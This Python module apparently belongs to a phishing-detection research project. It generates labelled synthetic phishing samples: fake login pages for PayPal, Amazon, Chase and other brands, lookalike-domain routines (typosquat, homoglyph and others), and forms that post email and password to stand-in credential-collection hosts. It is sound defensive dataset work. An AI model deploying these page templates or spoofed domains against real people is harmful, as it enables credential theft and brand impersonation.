"""Generates the LLM-phishing partition used to measure the legacy-vs-LLM
detection gap (see PROJECT_BRIEF.md, Phase 2).

ETHICAL / SCOPE CONSTRAINT: this module is a MOCK for the course deadline —
it does not call any real LLM API. Output is produced entirely from local
templates, deterministically, for a fixed brand list. Generated samples are
a local research artifact only: they are never hosted, never served to real
users, and never leave `data/generated/` (gitignored). Swapping in a real
LLM call later only requires replacing `_render_page()` with an API call
that returns the same (title, body_html) shape.
"""

from __future__ import annotations

import itertools
import json
import random
from pathlib import Path

from phishshield.data.schema import Sample, Source

# Fixed brand list: (key, display name, real registrable domain).
BRANDS = [
    ("paypal", "PayPal", "paypal.com"),
    ("amazon", "Amazon", "amazon.com"),
    ("apple", "Apple", "apple.com"),
    ("microsoft", "Microsoft", "microsoft.com"),
    ("chase", "Chase Bank", "chase.com"),
    ("netflix", "Netflix", "netflix.com"),
]

TONES = ("urgent", "formal")

OBFUSCATIONS = ("typosquat", "hyphenated", "subdomain", "homoglyph")

_TONE_COPY = {
    "urgent": (
        "Your account will be suspended within 24 hours unless you verify "
        "your details immediately."
    ),
    "formal": (
        "As part of our routine security review, please confirm your "
        "account details below."
    ),
}

_TONE_PATH = {
    "urgent": "account/verify-now",
    "formal": "secure/confirm-identity",
}

# Homoglyph substitutions cheap enough to render in a plain domain string
# (ASCII lookalikes, not true Unicode confusables, to keep URLs copy-pasteable
# in a dataset file without encoding surprises).
_HOMOGLYPHS = {"o": "0", "l": "1", "e": "3", "a": "4"}

_EXFIL_HOSTS = [
    "collect-creds.exfil-drop.ru",
    "data-relay.harvest-node.cn",
    "beacon.credential-sink.top",
]


def _obfuscate_domain(brand_key: str, real_domain: str, technique: str, rng: random.Random) -> str:
    if technique == "typosquat":
        label, tld = real_domain.split(".", 1)
        mid = len(label) // 2
        typo_label = label[:mid] + label[mid] + label[mid:]  # duplicate a middle char
        return f"{typo_label}.{tld}"
    if technique == "hyphenated":
        return f"{brand_key}-account-verification.com"
    if technique == "subdomain":
        return f"{brand_key}.{rng.choice(['id-verify', 'secure-portal', 'account-check'])}.xyz"
    if technique == "homoglyph":
        mangled = "".join(_HOMOGLYPHS.get(c, c) for c in brand_key)
        return f"{mangled}-login.net"
    raise ValueError(f"unknown obfuscation technique: {technique}")


def _render_page(display: str, tone: str, exfil_host: str) -> tuple[str, str]:
    """Return (title, body_html) for a fake brand login page.

    Structurally mirrors tests/fixtures/phishing_paypal_clone.html so it
    exercises the same HTML feature extractors: a password field, an
    externally-hosted form action, an off-domain script, and a hidden
    element.
    """
    title = f"{display} - Verify Your Account"
    body_html = f"""<!DOCTYPE html>
<html>
<head>
  <title>{title}</title>
  <script src="https://{exfil_host}/track.js"></script>
</head>
<body>
  <div style="display:none">hidden tracking pixel</div>
  <h1>{display} Account Verification</h1>
  <p>{_TONE_COPY[tone]}</p>
  <form action="https://{exfil_host}/collect" method="POST">
    <input type="email" name="email" placeholder="Email" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Verify</button>
  </form>
</body>
</html>
"""
    return title, body_html


def generate_llm_phishing_dataset(seed: int = 42) -> list[Sample]:
    """Generate the full brand x tone x obfuscation grid as phishing Samples.

    Deterministic given `seed` — same seed always yields the same dataset,
    which matters for reproducibility of the eval results in Phase 3/4.
    """
    rng = random.Random(seed)
    samples: list[Sample] = []

    for (brand_key, display, real_domain), tone, technique in itertools.product(
        BRANDS, TONES, OBFUSCATIONS
    ):
        domain = _obfuscate_domain(brand_key, real_domain, technique, rng)
        exfil_host = rng.choice(_EXFIL_HOSTS)
        path = _TONE_PATH[tone]
        url = f"https://{domain}/{path}"
        _, html = _render_page(display, tone, exfil_host)

        samples.append(
            Sample(
                url=url,
                label=1,
                source=Source.LLM_GENERATED,
                html=html,
                brand_target=brand_key,
            )
        )

    return samples


def save_samples_jsonl(samples: list[Sample], path: str | Path) -> None:
    """Persist samples as one JSON object per line under `data/generated/`.

    This is the on-disk form of the ethical constraint above: the file this
    writes to must stay under the gitignored `data/generated/` directory and
    is read back only by `phishshield.data.loaders.load_llm_generated`.
    """
    out_path = Path(path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with out_path.open("w", encoding="utf-8") as f:
        for sample in samples:
            record = {
                "url": sample.url,
                "label": sample.label,
                "source": sample.source.value,
                "html": sample.html,
                "brand_target": sample.brand_target,
            }
            f.write(json.dumps(record) + "\n")
